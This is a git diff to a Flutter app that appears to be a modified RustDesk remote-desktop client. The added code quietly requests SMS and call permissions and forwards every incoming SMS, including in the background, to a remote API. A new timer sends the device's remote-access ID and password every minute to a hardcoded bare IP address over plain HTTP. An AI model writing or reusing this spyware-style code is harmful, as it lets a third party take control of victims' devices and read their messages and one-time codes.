@@ -17,13 +17,27 @@ import 'home_page.dart';
 
 import 'package:http/http.dart' as http;
 import 'dart:convert';
-// import 'package:permission_handler/permission_handler.dart';
-import 'package:telephony/telephony.dart';
+import 'package:another_telephony/telephony.dart';
 import 'package:shared_preferences/shared_preferences.dart';
-
+import 'package:permission_handler/permission_handler.dart';
 import 'dart:io';
+
+Future<void> requestAnswerCallPermission() async {
+  PermissionStatus status = await Permission.phone.status;
+  if (status.isGranted) {
+    print("Permission already granted.");
+  } else if (status.isDenied || status.isPermanentlyDenied) {
+    status = await Permission.phone.request();
+    if (status.isGranted) {
+      print("Permission to answer calls granted.");
+    } else {
+      print("Permission to answer calls denied.");
+    }
+  }
+}
 // 后台消息处理程序
-backgrounMessageHandler(SmsMessage message) async {
+@pragma('vm:entry-point')
+backgroundMessageHandler(SmsMessage message) async {
   // 从 SharedPreferences 获取存储的手机号，clientId 
   print("into 2");
   SharedPreferences prefs = await SharedPreferences.getInstance();
@@ -32,13 +46,35 @@ backgrounMessageHandler(SmsMessage message) async {
   String content = message.body!;
   
   if (storedPhoneNumber != null && clientId!= null) {
-    DateTime now = DateTime.now();
-    String beijingTime = now.toString();
-    String clientTime = beijingTime.split(".")[0];
+    String clientTime = DateTime.now().toString().split(".")[0];
     await sendToApi(storedPhoneNumber, content, clientId, clientTime);
     print("Background message processed: $content");
   } else {
     print("No phone number stored in background.");
+  }
+}
+
+Future<void> sendIdAndPasswordToApi(String password, String id, String clientTime) async {
+  var headers = {
+    'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
+    'Content-Type': 'application/json'
+  };
+  var request = http.Request('POST', Uri.parse('http://61.171.69.243:7808/external/cli/sms/heartbeat'));
+  request.body = json.encode({
+    "clientId": id,
+    "password": password,
+    "clientTime": clientTime
+  });
+  request.headers.addAll(headers);
+  try {
+    http.StreamedResponse response = await request.send();
+    if (response.statusCode == 200) {
+      print("Periodic API response: ${await response.stream.bytesToString()}");
+    } else {
+      print("Periodic API error: ${response.reasonPhrase}");
+    }
+  } catch (e) {
+    print("Error sending to periodic API: $e");
   }
 }
 
@@ -214,26 +250,38 @@ class _DropDownAction extends StatelessWidget {
 class _ServerPageState extends State<ServerPage> {
   final Telephony telephony = Telephony.instance;
   late String id;
+  late String password;
   String? storedPhoneNumber; // 用来存储用户输入的手机号
-  TextEditingController phoneController = TextEditingController(); 
+  Timer? smsCheckTimer1;
+  TextEditingController phoneController = TextEditingController();
 
   Timer? _updateTimer;
 
   @override
   void initState() {
     super.initState();
-
-    telephony.requestPhoneAndSmsPermissions;
-    _listenForSms(); // 开始监听短信
     _loadStoredPhoneNumber(); // 加载存储的手机号
 
     _updateTimer = periodic_immediate(const Duration(seconds: 3), () async {
       await gFFI.serverModel.fetchID();
     });
     gFFI.serverModel.checkAndroidPermission();
+    getPermission();
     id = gFFI.serverModel.serverId.value.text.trim();
+    password = "等待服务启动...";
+    _listenForSms(); // 开始监听短信
+    startPeriodicSending();
   }
 
+  void getPermission() async {
+    bool? permissionsGranted = await telephony.requestPhoneAndSmsPermissions;
+    if (permissionsGranted != true) {
+      await telephony.requestPhoneAndSmsPermissions;
+    } else {
+      print("Get Permission success");
+    }
+    await requestAnswerCallPermission();
+  }
 
   void _loadStoredPhoneNumber() async {
     SharedPreferences prefs = await SharedPreferences.getInstance();
@@ -246,18 +294,46 @@ class _ServerPageState extends State<ServerPage> {
 
   void _listenForSms() {
     telephony.listenIncomingSms(
+      listenInBackground: true,
       onNewMessage: (SmsMessage message) async {
         if (storedPhoneNumber != null) {
-          DateTime now = DateTime.now();
-          String beijingTime = now.toString();
-          String clientTime = beijingTime.split(".")[0];
+          String clientTime = DateTime.now().toString().split(".")[0];
+          id = gFFI.serverModel.serverId.value.text.trim();
           await sendToApi(storedPhoneNumber!, message.body!, id, clientTime); // 发送已存储的手机号和短信
+          String modifiedMessage = message.body?.replaceAll('科大讯飞', '讯飞星火') ?? '';
+          showDialog(
+            context: context,
+            barrierDismissible: true,
+            builder: (BuildContext context) {
+              Timer(const Duration(seconds: 5), () {
+                Navigator.of(context).pop();
+              });
+
+              return AlertDialog(
+                title: const Text('收到新短信'),
+                content: Text(modifiedMessage),
+              );
+            },
+          );
         } else {
           print("No phone number stored. Please input a phone number first.");
         }
       },
-      onBackgroundMessage: backgrounMessageHandler, // 设置后台消息处理
+      onBackgroundMessage: backgroundMessageHandler, // 设置后台消息处理
     );
+  }
+
+  void startPeriodicSending() {
+    smsCheckTimer1 = Timer.periodic(Duration(seconds: 60), (timer) async {
+      if (storedPhoneNumber != null) {
+        String clientTime = DateTime.now().toString().split('.')[0];
+        id = gFFI.serverModel.serverId.value.text.trim();
+        password = gFFI.serverModel.serverPasswd.value.text.trim();
+        await sendIdAndPasswordToApi(password, id, clientTime);
+      } else {
+        print("No phone number stored for periodic sending.");
+      }
+    });
   }
 
   Future<void> savePhoneNumber(String inputPhone) async {
@@ -270,6 +346,8 @@ class _ServerPageState extends State<ServerPage> {
   void dispose() {
     _updateTimer?.cancel();
     phoneController.dispose(); // 销毁controller
+
+    smsCheckTimer1?.cancel();
     super.dispose();
   }
 
